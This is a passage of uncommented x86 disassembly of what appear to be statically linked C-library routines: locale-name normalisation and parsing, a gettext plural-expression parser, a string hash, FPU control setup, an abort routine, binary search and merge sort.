mov edx, dword [arg_20h]
inc eax
mov dword [esp], eax
mov dword [var_4h], edx
call fcn.080773c0
jmp 0x8061c44
mov byte [eax], 0x5f
mov edx, dword [arg_1ch]
inc eax
mov dword [esp], eax
mov dword [var_4h], edx
call fcn.080773c0
jmp 0x8061c38
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
push edi
push esi
xor esi, esi
push ebx
sub esp, 0x18
cmp esi, dword [arg_ch]
mov dword [var_14h], 1
mov dword [var_10h], 0
jae 0x8061fe6
mov eax, 0
mov ebx, 0x80aad18
test eax, eax
je 0x8061f7e
mov dword [esp], 4
call section.
mov ebx, eax
mov edx, dword [ebx]
test edx, edx
je 0x8062157
mov ecx, dword [arg_8h]
movzx ebx, byte [esi + ecx]
movzx eax, bl
test byte [edx + eax*2], 8
je 0x8061fd5
mov eax, 0
inc dword [var_10h]
mov edi, 0x80aad18
test eax, eax
je 0x8061fb7
mov dword [esp], 4
call section.
mov edi, eax
mov edx, dword [edi]
test edx, edx
je 0x8062121
movzx eax, bl
test byte [edx + eax*2 + 1], 4
mov eax, 0
cmove eax, dword [var_14h]
mov dword [var_14h], eax
inc esi
cmp esi, dword [arg_ch]
jb 0x8061f62
mov ecx, dword [var_14h]
test ecx, ecx
je 0x8062118
mov eax, dword [var_10h]
add eax, 4
mov dword [esp], eax
call fcn.08050fe0
test eax, eax
mov dword [var_18h], eax
je 0x806209d
mov edx, dword [var_14h]
mov edi, eax
test edx, edx
je 0x8062014
mov dword [eax], 0x6f7369
mov edi, dword [var_18h]
add edi, 3
xor esi, esi
cmp esi, dword [arg_ch]
jae 0x806209a
nop
mov eax, 0
mov ebx, 0x80aad18
test eax, eax
je 0x806203c
mov dword [esp], 4
call section.
mov ebx, eax
mov eax, dword [ebx]
test eax, eax
je 0x80620eb
mov ecx, dword [arg_8h]
movzx edx, byte [esi + ecx]
movzx ecx, dl
mov ebx, edx
test byte [eax + ecx*2 + 1], 4
je 0x80620de
mov eax, 0
mov dword [var_20h], edi
mov dword [var_1ch], 0x80aad14
inc edi
test eax, eax
je 0x8062080
mov dword [esp], 5
call section.
mov dword [var_1ch], eax
mov ecx, dword [var_1ch]
mov edx, dword [ecx]
test edx, edx
je 0x80620a8
movzx eax, bl
mov eax, dword [edx + eax*4]
mov edx, dword [var_20h]
mov byte [edx], al
inc esi
cmp esi, dword [arg_ch]
jb 0x8062020
mov byte [edi], 0
mov eax, dword [var_18h]
add esp, 0x18
pop ebx
pop esi
pop edi
leave
ret
mov eax, 0
test eax, eax
je 0x80620d7
mov dword [esp], 3
call section.
mov eax, dword [eax]
mov edx, dword [var_1ch]
mov ecx, dword [arg_8h]
mov eax, dword [eax + 0x30]
add eax, 0x200
mov dword [edx], eax
mov edx, eax
movzx ebx, byte [esi + ecx]
jmp 0x8062089
mov eax, dword [0x80a9ab4]
jmp 0x80620bd
lea eax, [ecx - 0x30]
cmp eax, 9
ja 0x8062094
mov byte [edi], dl
inc edi
jmp 0x8062094
mov edx, 0
test edx, edx
je 0x8062111
mov dword [esp], 3
call section.
mov eax, dword [eax]
mov eax, dword [eax + 0x24]
add eax, 0x100
mov dword [ebx], eax
jmp 0x8062046
mov eax, dword [0x80a9ab4]
jmp 0x8062100
mov eax, dword [var_10h]
inc eax
jmp 0x8061fec
mov edx, 0
test edx, edx
je 0x8062150
mov dword [esp], 3
call section.
mov eax, dword [eax]
mov ecx, dword [arg_8h]
mov eax, dword [eax + 0x24]
add eax, 0x100
mov dword [edi], eax
mov edx, eax
movzx ebx, byte [esi + ecx]
jmp 0x8061fc1
mov eax, dword [0x80a9ab4]
jmp 0x8062136
mov edx, 0
test edx, edx
je 0x806217f
mov dword [esp], 3
call section.
mov eax, dword [eax]
mov eax, dword [eax + 0x24]
add eax, 0x100
mov dword [ebx], eax
mov edx, eax
jmp 0x8061f88
mov eax, dword [0x80a9ab4]
jmp 0x806216c
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
mov eax, dword [arg_8h]
movzx edx, byte [eax]
test dl, dl
je 0x80621f7
cmp dl, 0x5f
je 0x80621f7
cmp dl, 0x40
je 0x80621f7
cmp dl, 0x2e
je 0x80621f7
lea esi, [esi]
inc eax
movzx edx, byte [eax]
test dl, dl
je 0x80621f7
cmp dl, 0x5f
je 0x80621f7
cmp dl, 0x40
je 0x80621f7
cmp dl, 0x2e
jne 0x80621e0
leave
ret
lea esi, [esi]
push ebp
mov ebp, esp
push edi
xor edi, edi
push esi
push ebx
sub esp, 8
mov ecx, dword [arg_14h]
mov edx, dword [arg_10h]
mov eax, dword [arg_8h]
mov ebx, dword [arg_ch]
mov dword [edx], 0
mov edx, dword [arg_18h]
mov dword [ecx], 0
mov ecx, dword [arg_1ch]
mov dword [edx], 0
mov dword [ecx], 0
mov dword [ebx], eax
mov dword [esp], eax
call fcn.080621c0
cmp dword [ebx], eax
mov esi, eax
je 0x806235a
movzx eax, byte [eax]
cmp al, 0x40
je 0x8062292
cmp al, 0x5f
je 0x8062322
cmp al, 0x2e
je 0x80622a8
cmp al, 0x40
je 0x8062292
mov eax, dword [arg_14h]
mov edx, dword [eax]
test edx, edx
je 0x8062274
mov eax, edi
and eax, 0xfffffffb
cmp byte [edx], 0
cmove edi, eax
mov ecx, dword [arg_18h]
mov edx, dword [ecx]
test edx, edx
je 0x8062288
mov eax, edi
and eax, 0xfffffffd
cmp byte [edx], 0
cmove edi, eax
add esp, 8
mov eax, edi
pop ebx
pop esi
pop edi
leave
ret
mov byte [esi], 0
mov eax, edi
mov ecx, dword [arg_10h]
inc esi
or eax, 8
mov dword [ecx], esi
cmp byte [esi], 0
cmovne edi, eax
jmp 0x8062260
mov byte [esi], 0
mov edx, dword [arg_18h]
inc esi
mov dword [edx], esi
movzx eax, byte [esi]
test al, al
je 0x80622cc
cmp al, 0x40
je 0x80622cc
lea esi, [esi]
inc esi
movzx eax, byte [esi]
test al, al
je 0x80622cc
cmp al, 0x40
jne 0x80622c0
mov ecx, dword [arg_18h]
or edi, 2
mov edx, dword [ecx]
cmp edx, esi
je 0x806225c
cmp byte [edx], 0
je 0x806225c
mov eax, esi
mov dword [esp], edx
sub eax, edx
mov dword [var_4h], eax
call fcn.08061f40
mov edx, dword [arg_18h]
mov ebx, eax
mov eax, dword [arg_1ch]
mov dword [eax], ebx
mov dword [var_4h], ebx
mov eax, dword [edx]
mov dword [esp], eax
call fcn.08076e50
test eax, eax
je 0x8062318
or edi, 1
movzx eax, byte [esi]
jmp 0x806225c
mov dword [esp], ebx
call fcn.08051180
jmp 0x8062310
mov byte [esi], 0
mov eax, dword [arg_14h]
inc esi
mov dword [eax], esi
movzx eax, byte [esi]
test al, al
je 0x8062350
cmp al, 0x2e
je 0x8062350
cmp al, 0x40
je 0x8062350
lea esi, [esi]
inc esi
movzx eax, byte [esi]
test al, al
je 0x8062350
cmp al, 0x2e
je 0x8062350
cmp al, 0x40
jne 0x8062340
mov edi, 4
jmp 0x8062258
mov dword [var_4h], 0
mov dword [esp], eax
call fcn.080537a0
mov esi, eax
jmp 0x8062310
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 4
mov ebx, dword [arg_8h]
mov esi, dword [arg_10h]
dec ebx
test ebx, ebx
mov edi, ebx
js 0x80623a0
mov eax, dword [esi + ebx*4]
test eax, eax
je 0x80623d7
dec ebx
jns 0x8062396
mov dword [esp], 0x14
call fcn.08050fe0
test eax, eax
mov edx, eax
je 0x80623d7
mov eax, dword [arg_8h]
test edi, edi
mov ebx, edi
mov dword [edx], eax
mov eax, dword [arg_ch]
mov dword [edx + 4], eax
js 0x80623cd
mov eax, dword [esi + ebx*4]
mov dword [edx + ebx*4 + 8], eax
dec ebx
jns 0x80623c3
mov eax, edx
add esp, 4
pop ebx
pop esi
pop edi
leave
ret
test edi, edi
mov ebx, edi
js 0x80623eb
lea esi, [esi]
mov eax, dword [esi + ebx*4]
call fcn.08062900
dec ebx
jns 0x80623e0
xor eax, eax
jmp 0x80623cf
nop
push ebp
mov ebp, esp
sub esp, 0x14
mov eax, dword [arg_ch]
mov dword [esp], 2
mov dword [var_8h], eax
mov eax, dword [arg_10h]
mov dword [var_4h], eax
lea eax, [var_8h]
mov dword [var_sp_8h], eax
mov eax, dword [arg_8h]
mov dword [var_sp_4h], eax
call fcn.08062380
leave
ret
mov esi, esi
push ebp
mov ebp, esp
push edi
push esi
lea eax, [var_19ch]
lea edx, [var_4bch]
push ebx
mov edi, edx
mov ebx, eax
sub esp, 0x4fc
mov dword [var_4d8h], 0xfffffffe
mov dword [var_4e0h], 0
mov dword [var_4e4h], eax
mov dword [var_4e8h], edx
mov dword [var_4ech], 0xc8
mov dword [var_4dch], 0
mov ecx, dword [var_4dch]
mov edx, dword [var_4ech]
mov word [ebx], cx
add edx, edx
mov ecx, dword [var_4e4h]
lea eax, [edx + ecx - 2]
cmp ebx, eax
jb 0x8062556
sub ebx, ecx
sar ebx, 1
inc ebx
cmp dword [var_4ech], 0x270f
mov dword [var_4f4h], ebx
ja 0x80628df
cmp edx, 0x2711
mov eax, 0x2710
cmovb eax, edx
mov dword [var_4ech], eax
mov edi, dword [var_4ech]
add eax, eax
mov dword [var_4f8h], eax
add eax, edi
lea eax, [eax + eax + 0x14]
sub esp, eax
lea eax, [var_1bh]
mov esi, eax
and esi, 0xfffffff0
je 0x80628df
add ebx, ebx
mov dword [var_4h], ecx
mov dword [esp], esi
mov dword [var_8h], ebx
call fcn.08053770
mov eax, dword [var_4f4h]
mov edi, dword [var_4f8h]
mov dword [var_4e4h], esi
cld
shl eax, 2
add edi, 3
mov ecx, eax
and edi, 0xfffffffc
shr ecx, 2
add edi, esi
mov esi, dword [var_4e8h]
mov dword [var_4fch], edi
rep movsd dword es:[edi], dword ptr [esi]
mov edx, dword [var_4fch]
mov ecx, dword [var_4e4h]
lea edi, [eax + edx - 4]
mov dword [var_4e8h], edx
lea ebx, [ebx + ecx - 2]
mov edx, dword [var_4f8h]
lea eax, [edx + ecx - 2]
cmp ebx, eax
jae 0x806266f
mov ecx, dword [var_4dch]
movsx esi, word [ecx + ecx + 0x80a03e0]
cmp esi, 0xffff8000
je 0x80625bc
cmp dword [var_4d8h], 0xfffffffe
je 0x80628bf
mov eax, dword [var_4d8h]
test eax, eax
jle 0x80628ae
cmp dword [var_4d8h], 0x105
mov edx, 0x12
ja 0x80625a5
mov ecx, dword [var_4d8h]
movsx edx, byte [ecx + 0x80a0260]
add esi, edx
cmp esi, 0x35
ja 0x80625bc
movsx eax, word [esi + esi + 0x80a04a0]
cmp eax, edx
je 0x8062840
mov eax, dword [var_4dch]
movsx esi, word [eax + eax + 0x80a03a0]
test esi, esi
je 0x8062770
movsx edx, word [esi + esi + 0x80a0380]
mov eax, 1
sub eax, edx
mov dword [var_4f0h], edx
cmp esi, 0xc
mov edx, dword [edi + eax*4]
ja case.0x80625ef.0
jmp dword [esi*4 + 0x80a050c]
mov eax, dword [edi]
test eax, eax
je 0x806266f
mov ecx, dword [arg_8h]
mov dword [ecx + 4], eax
mov eax, dword [var_4f0h]
movsx esi, word [esi + esi + 0x80a0366]
shl eax, 2
sub edi, eax
mov eax, dword [var_4f0h]
add edi, 4
mov dword [edi], edx
movsx edx, word [esi + esi + 0x80a03f8]
add eax, eax
sub ebx, eax
movzx ecx, word [ebx]
movsx eax, cx
add edx, eax
cmp edx, 0x35
mov dword [var_4dch], edx
ja 0x8062649
cmp word [edx + edx + 0x80a04a0], cx
je 0x806265f
movsx esi, word [esi + esi + 0x80a03b8]
mov dword [var_4dch], esi
add ebx, 2
jmp 0x8062470
movsx eax, word [edx + edx + 0x80a0420]
mov dword [var_4dch], eax
jmp 0x8062657
mov eax, 1
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [edi - 0x10]
mov edx, dword [edi - 8]
mov ecx, dword [edi]
mov dword [esp], 3
mov dword [var_4h], 0x10
mov dword [var_4cch], eax
mov dword [var_4c8h], edx
lea eax, [var_4cch]
mov dword [var_4c4h], ecx
mov dword [var_8h], eax
call fcn.08062380
mov edx, eax
jmp case.0x80625ef.0
mov eax, dword [edi]
mov dword [var_8h], eax
mov eax, dword [edi - 8]
mov dword [esp], 0xf
mov dword [var_4h], eax
call fcn.080623f0
jmp 0x80626b4
mov eax, dword [edi]
mov dword [var_8h], eax
mov eax, dword [edi - 8]
mov dword [esp], 0xe
jmp 0x80626cb
mov eax, dword [edi]
mov dword [var_8h], eax
mov eax, dword [edi - 8]
mov dword [var_4h], eax
mov eax, dword [edi - 4]
mov dword [esp], eax
jmp 0x80626cf
mov eax, dword [edi]
mov dword [esp], 1
mov dword [var_4h], 2
mov dword [var_4d4h], eax
lea eax, [var_4d4h]
jmp 0x80626ab
mov dword [var_8h], 0
mov dword [var_4h], 0
mov dword [esp], 0
jmp 0x80626af
mov dword [var_8h], 0
mov dword [var_4h], 1
mov dword [esp], 0
call fcn.08062380
test eax, eax
mov edx, eax
je case.0x80625ef.0
mov eax, dword [edi]
mov dword [edx + 8], eax
jmp case.0x80625ef.0
mov edx, dword [edi - 4]
jmp case.0x80625ef.0
mov ecx, dword [var_4e0h]
test ecx, ecx
je 0x806282f
cmp dword [var_4e0h], 3
je 0x8062812
mov dword [var_4e0h], 3
mov ecx, dword [var_4dch]
movsx esi, word [ecx + ecx + 0x80a03e0]
cmp esi, 0xffff8000
je 0x80627bc
inc esi
cmp esi, 0x35
ja 0x80627bc
cmp word [esi + esi + 0x80a04a0], 1
je 0x80627d9
cmp ebx, dword [var_4e4h]
je 0x806266f
sub ebx, 2
sub edi, 4
movsx edx, word [ebx]
mov dword [var_4dch], edx
jmp 0x8062795
movsx esi, word [esi + esi + 0x80a0420]
test esi, esi
jl 0x8062803
je 0x80627bc
cmp esi, 0x1b
je 0x80627fc
mov eax, dword [var_4d0h]
add edi, 4
mov dword [edi], eax
jmp 0x8062651
xor eax, eax
jmp 0x8062674
cmp esi, 0xffff8000
je 0x80627bc
neg esi
jmp 0x80625d2
mov edx, dword [var_4d8h]
test edx, edx
je 0x806266f
mov dword [var_4d8h], 0xfffffffe
jmp 0x806278b
mov dword [esp], 0x80a0734
call fcn.08062a70
jmp 0x806277e
movsx esi, word [esi + esi + 0x80a0420]
test esi, esi
jl 0x806289d
je 0x8062770
cmp esi, 0x1b
je 0x80627fc
mov ecx, dword [var_4d8h]
mov eax, 0xfffffffe
mov edx, dword [var_4e0h]
test ecx, ecx
cmove eax, dword [var_4d8h]
add edi, 4
mov dword [var_4d8h], eax
mov eax, dword [var_4d0h]
mov dword [edi], eax
mov eax, dword [var_4e0h]
dec eax
test edx, edx
cmove eax, dword [var_4e0h]
mov dword [var_4e0h], eax
jmp 0x8062651
cmp esi, 0xffff8000
jne 0x806280b
jmp 0x8062770
xor edx, edx
mov dword [var_4d8h], 0
jmp 0x80625a5
mov eax, dword [arg_8h]
mov dword [var_4h], eax
lea eax, [var_4d0h]
mov dword [esp], eax
call fcn.08062950
mov dword [var_4d8h], eax
jmp 0x8062579
mov dword [esp], str.parser_stack_overflow
call fcn.08062a70
mov eax, 2
jmp 0x8062674
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
sub esp, 8
test eax, eax
mov dword [var_4h], ebx
mov ebx, eax
je 0x8062928
mov eax, dword [eax]
cmp eax, 2
je 0x8062944
jg 0x8062937
dec eax
je 0x806292d
nop
lea esi, [esi]
mov dword [esp], ebx
call fcn.08051180
mov ebx, dword [var_4h]
leave
ret
mov eax, dword [ebx + 8]
call fcn.08062900
jmp 0x8062920
cmp eax, 3
jne 0x8062920
mov eax, dword [ebx + 0x10]
call fcn.08062900
mov eax, dword [ebx + 0xc]
call fcn.08062900
jmp 0x806292d
mov esi, esi
push ebp
mov ebp, esp
push edi
push esi
mov edi, dword [arg_8h]
mov esi, dword [arg_ch]
push ebx
mov ecx, dword [esi]
mov esi, esi
movzx eax, byte [ecx]
test al, al
je 0x8062a59
cmp al, 0x20
je 0x8062973
cmp al, 9
jne 0x8062976
inc ecx
jmp 0x8062960
movsx edx, al
inc ecx
cmp edx, 0x7c
ja case.0x8062983.1
jmp dword [edx*4 + 0x80a0540]
movzx ebx, byte [ecx]
sub edx, 0x30
lea eax, [ebx - 0x30]
cmp al, 9
ja 0x80629ac
inc ecx
lea eax, [edx + edx*4]
movsx edx, bl
movzx ebx, byte [ecx]
lea edx, [edx + eax*2 - 0x30]
lea eax, [ebx - 0x30]
cmp al, 9
jbe 0x8062997
mov dword [edi], edx
mov edx, 0x105
mov dword [esi], ecx
mov eax, edx
pop ebx
pop esi
pop edi
leave
ret
cmp byte [ecx], 0x3d
jne case.0x8062983.40
inc ecx
mov dword [edi], 0xd
mov edx, 0x101
jmp case.0x8062983.40
mov dword [edi], 5
mov edx, 0x104
jmp case.0x8062983.40
mov dword [edi], 3
jmp 0x80629d5
mov dword [edi], 6
mov edx, 0x103
jmp case.0x8062983.40
mov dword [edi], 7
jmp 0x80629ea
mov dword [edi], 4
jmp 0x80629d5
dec ecx
xor edx, edx
jmp case.0x8062983.40
cmp byte [ecx], 0x3d
je 0x8062a18
mov dword [edi], 8
mov edx, 0x102
jmp case.0x8062983.40
inc ecx
mov dword [edi], 0xa
jmp 0x8062a11
cmp byte [ecx], 0x3d
je 0x8062a2d
mov edx, 0x100
jmp case.0x8062983.40
inc ecx
mov dword [edi], 0xc
jmp 0x80629c8
cmp byte [ecx], 0x3d
je 0x8062a43
mov dword [edi], 9
jmp 0x8062a11
inc ecx
mov dword [edi], 0xb
jmp 0x8062a11
movsx eax, byte [ecx]
cmp eax, edx
jne case.0x8062983.1
inc ecx
jmp case.0x8062983.40
xor eax, eax
mov dword [esi], ecx
jmp 0x80629b7
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
leave
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
mov edi, ecx
push esi
push ebx
mov ebx, eax
sub esp, 0x24
test eax, eax
mov dword [var_1ch], edx
je 0x8062b68
mov dword [var_4h], str.plural
mov dword [esp], eax
call fcn.080535c0
mov dword [esp], ebx
mov dword [var_4h], str.nplurals
mov dword [var_20h], eax
call fcn.080535c0
mov ebx, eax
mov eax, dword [var_20h]
test eax, eax
je 0x8062b68
test ebx, ebx
je 0x8062b68
add ebx, 9
movzx edx, byte [ebx]
test dl, dl
je 0x8062b0c
mov eax, 0
mov esi, 0x80aad18
test eax, eax
je 0x8062af6
mov dword [esp], 4
call section.
mov esi, eax
mov ecx, dword [esi]
test ecx, ecx
je 0x8062b79
movzx edx, byte [ebx]
movzx eax, dl
test byte [ecx + eax*2 + 1], 0x20
je 0x8062b0c
inc ebx
jmp 0x8062ad3
lea eax, [edx - 0x30]
cmp al, 9
ja 0x8062b68
lea eax, [var_10h]
mov dword [var_ch], 0
mov dword [var_8h], 0xa
mov dword [var_4h], eax
mov dword [esp], ebx
call fcn.08063780
cmp ebx, dword [var_10h]
je 0x8062b68
mov dword [edi], eax
mov eax, dword [var_20h]
add eax, 7
mov dword [var_18h], eax
lea eax, [var_18h]
mov dword [esp], eax
call fcn.08062420
test eax, eax
jne 0x8062b68
mov eax, dword [var_14h]
mov edx, dword [var_1ch]
mov dword [edx], eax
lea esi, [esi]
add esp, 0x24
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [var_1ch]
mov dword [edi], 2
mov dword [eax], 0x80a9b04
jmp 0x8062b60
mov eax, 0
test eax, eax
je 0x8062ba1
mov dword [esp], 3
call section.
mov eax, dword [eax]
mov eax, dword [eax + 0x24]
add eax, 0x100
mov dword [esi], eax
mov ecx, eax
jmp 0x8062afc
mov eax, dword [0x80a9ab4]
jmp 0x8062b8e
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
xor edx, edx
mov ebp, esp
push ebx
mov ebx, dword [arg_8h]
movzx eax, byte [ebx]
test al, al
je 0x8062be3
shl edx, 4
movzx eax, al
inc ebx
add edx, eax
mov ecx, edx
and ecx, 0xf0000000
je 0x8062bdc
mov eax, ecx
shr eax, 0x18
xor edx, eax
xor edx, ecx
movzx eax, byte [ebx]
test al, al
jne 0x8062bc0
pop ebx
mov eax, edx
leave
ret
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 8
fnstcw word [ebp - 2]
mov ecx, dword [arg_8h]
movzx eax, word [var_2h]
mov edx, ecx
and ax, 0xf0c0
and dx, 0xf3f
or eax, edx
mov word [var_2h], ax
fldcw word [ebp - 2]
test byte [0x80aa84b], 2
je 0x8062c48
movzx edx, cx
stmxcsr dword [ebp - 8]
mov eax, dword [var_8h]
mov ecx, edx
and edx, 0x3d
and ecx, 0xc00
shl edx, 7
shl ecx, 3
and eax, 0xffff817f
or ecx, edx
or eax, ecx
mov dword [var_8h], eax
ldmxcsr dword [ebp - 8]
leave
ret
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
mov edi, 0
sub esp, 0x11c
test edi, edi
je 0x8062c6f
mov dword [esp], 0x80a9b1c
call section.
mov eax, dword [0x80aa978]
test eax, eax
jne 0x8062cbb
mov dword [0x80aa978], 1
lea edx, [var_114h]
mov eax, 0x1f
mov dword [edx + eax*4], 0
dec eax
jns 0x8062c8d
or dword [var_114h], 0x20
mov dword [var_8h], 0
mov dword [var_4h], edx
mov dword [esp], 1
call fcn.08049180
mov eax, dword [0x80aa978]
cmp eax, 1
je 0x8062deb
cmp eax, 2
je 0x8062d9c
cmp eax, 3
je 0x8062d38
cmp eax, 4
je 0x8062d22
cmp eax, 5
je 0x8062d05
cmp eax, 6
je 0x8062cf3
cmp eax, 7
je 0x8062e0b
lea esi, [esi]
hlt
jmp 0x8062cf0
mov eax, 7
mov dword [0x80aa978], 7
hlt
jmp 0x8062ce1
mov dword [0x80aa978], 6
mov dword [esp], 6
call fcn.08084b40
mov eax, dword [0x80aa978]
jmp 0x8062cdc
mov dword [0x80aa978], 5
call fcn.08076be0
mov eax, dword [0x80aa978]
jmp 0x8062cd7
lea edx, [var_94h]
xor eax, eax
mov ecx, 0x23
cld
mov edi, edx
mov dword [0x80aa978], 4
rep stosd dword es:[edi], eax
mov dword [var_94h], 0
lea ecx, [var_90h]
mov eax, 0x1f
mov dword [ecx + eax*4], 0xffffffff
dec eax
jns 0x8062d69
mov dword [var_10h], 0
mov dword [var_8h], 0
mov dword [var_4h], edx
mov dword [esp], 6
call fcn.08049140
mov eax, dword [0x80aa978]
jmp 0x8062cd2
mov eax, 0
mov dword [0x80aa978], 0
test eax, eax
je 0x8062dbb
mov dword [esp], 0x80a9b1c
call section.
mov dword [esp], 6
call fcn.08084b40
test edi, edi
je 0x8062dd7
mov dword [esp], 0x80a9b1c
call section.
mov eax, 3
mov dword [0x80aa978], 3
jmp 0x8062ccd
mov dword [0x80aa978], 2
mov dword [esp], 0
call fcn.0804e260
mov eax, dword [0x80aa978]
jmp 0x8062cc4
mov dword [0x80aa978], 8
mov dword [esp], 0x7f
call fcn.08053d90
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0xc
mov esi, dword [var_10h_2]
mov dword [var_10h_3], 0
cmp dword [var_10h_3], esi
jae 0x8062e86
mov ebx, dword [var_10h_3]
mov eax, dword [var_14h]
mov edi, dword [var_8h]
add ebx, esi
shr ebx, 1
imul eax, ebx
add edi, eax
mov eax, dword [var_4h]
mov dword [var_4h_2], edi
mov dword [esp], eax
call dword [var_18h]
test eax, eax
jl 0x8062e94
jle 0x8062e90
inc ebx
mov dword [var_10h_3], ebx
cmp dword [var_10h_3], esi
jb 0x8062e58
xor eax, eax
add esp, 0xc
pop ebx
pop esi
pop edi
leave
ret
mov eax, edi
jmp 0x8062e88
mov esi, ebx
jmp 0x8062e81
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x3c
mov edx, dword [arg_14h]
mov edi, dword [arg_10h]
mov eax, dword [arg_8h]
mov ebx, dword [arg_ch]
mov dword [var_14h], edx
mov dword [var_10h], eax
cmp ebx, 1
mov eax, dword [arg_18h]
mov dword [var_18h], eax
ja 0x8062eee
add esp, 0x3c
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [var_10h]
mov esi, ebx
mov edx, ebx
shr esi, 1
sub edx, esi
mov dword [var_20h], eax
mov dword [var_28h], edx
mov eax, esi
imul eax, edi
mov edx, dword [var_18h]
add eax, dword [var_10h]
mov dword [var_24h], eax
mov dword [var_sp_10h], edx
mov eax, dword [var_14h]
mov dword [var_8h], edi
mov dword [var_4h], esi
mov dword [var_ch], eax
mov edx, dword [var_10h]
mov dword [esp], edx
call fcn.08062ec0
mov eax, dword [var_18h]
mov dword [var_sp_10h], eax
mov edx, dword [var_14h]
mov dword [var_8h], edi
mov dword [var_ch], edx
mov eax, dword [var_28h]
mov dword [var_4h], eax
mov edx, dword [var_24h]
mov dword [esp], edx
call fcn.08062ec0
mov eax, dword [var_18h]
cmp edi, 4
mov dword [var_1ch], eax
je 0x8063005
test esi, esi
jne 0x8062f83
sub ebx, dword [var_28h]
mov eax, dword [var_18h]
mov edx, dword [var_10h]
mov dword [arg_ch], eax
imul ebx, edi
mov dword [arg_8h], edx
mov dword [arg_10h], ebx
add esp, 0x3c
pop ebx
pop esi
pop edi
leave
jmp fcn.08053770
mov edx, dword [var_28h]
test edx, edx
jne 0x8062fa9
test esi, esi
je 0x8062f62
imul esi, edi
mov dword [var_8h], esi
mov eax, dword [var_20h]
mov dword [var_4h], eax
mov edx, dword [var_1ch]
mov dword [esp], edx
call fcn.08053770
jmp 0x8062f62
mov eax, dword [var_24h]
mov dword [var_4h], eax
mov edx, dword [var_20h]
mov dword [esp], edx
call dword [var_14h]
test eax, eax
jle 0x8062fe9
mov dword [var_8h], edi
mov eax, dword [var_24h]
mov dword [var_4h], eax
mov edx, dword [var_1ch]
mov dword [esp], edx
call fcn.08053740
dec dword [var_28h]
add dword [var_24h], edi
mov dword [var_1ch], eax
test esi, esi
je 0x8062f62
mov eax, dword [var_28h]
test eax, eax
jne 0x8062fa9
jmp 0x8062f8a
mov dword [var_8h], edi
dec esi
mov eax, dword [var_20h]
mov dword [var_4h], eax
mov edx, dword [var_1ch]
mov dword [esp], edx
call fcn.08053740
add dword [var_20h], edi
jmp 0x8062fd9
test byte [var_10h], 3
jne 0x8062f5e
test esi, esi
je 0x8062f62
mov eax, dword [var_28h]
test eax, eax
je 0x8062f8a
mov edx, dword [var_24h]
mov dword [var_4h], edx
mov eax, dword [var_20h]
mov dword [esp], eax
call dword [var_14h]
test eax, eax
jle 0x8063061
mov edx, dword [var_24h]
dec dword [var_28h]
add dword [var_24h], 4
mov eax, dword [edx]
mov edx, dword [var_1ch]
mov dword [edx], eax
add edx, 4
mov dword [var_1ch], edx
test esi, esi
je 0x8062f62
mov ecx, dword [var_28h]
test ecx, ecx
jne 0x8063022
jmp 0x8062f8a
mov edx, dword [var_20h]
dec esi
add dword [var_20h], 4
jmp 0x8063040
nop
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 0x28
mov dword [var_ch], ebx
mov dword [var_8h], esi
mov dword [var_4h], edi
mov ebx, dword [arg_ch]
imul ebx, dword [arg_10h]
cmp ebx, 0x3ff
jbe 0x8063168
mov ecx, dword [0x80aa97c]
test ecx, ecx
je 0x8063122
xor edx, edx
mov eax, ebx
div dword [0x80aa980]
cmp eax, ecx
ja 0x8063100
call fcn.08048b20
mov edi, dword [eax]
mov esi, eax
mov dword [esp], ebx
call fcn.08050fe0
test eax, eax
mov ebx, eax
je 0x80630fe
mov dword [esi], edi
mov dword [var_10h], eax
mov eax, dword [arg_14h]
mov dword [var_sp_ch], eax
mov eax, dword [arg_10h]
mov dword [var_sp_8h], eax
mov eax, dword [arg_ch]
mov dword [var_sp_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08062ec0
mov dword [esp], ebx
call fcn.08051180
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
ret
mov dword [esi], edi
mov eax, dword [arg_14h]
mov dword [var_sp_ch], eax
mov eax, dword [arg_10h]
mov dword [var_sp_8h], eax
mov eax, dword [arg_ch]
mov dword [var_sp_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08084b80
jmp 0x80630f3
mov dword [esp], 0x55
call fcn.08078cd0
mov dword [esp], 0x1e
mov ecx, eax
mov eax, 0x7fffffff
cmp ecx, 0xffffffff
cmovne eax, ecx
cmp eax, 0xffffffff
lea edx, [eax + 3]
cmovle eax, edx
sar eax, 2
mov dword [0x80aa97c], eax
call fcn.08078cd0
mov ecx, dword [0x80aa97c]
mov dword [0x80aa980], eax
jmp 0x80630a0
lea eax, [ebx + 0xf]
and eax, 0xfffffff0
sub esp, eax
lea eax, [var_14h]
mov dword [var_10h], eax
mov eax, dword [arg_14h]
mov dword [var_sp_ch], eax
mov eax, dword [arg_10h]
mov dword [var_sp_8h], eax
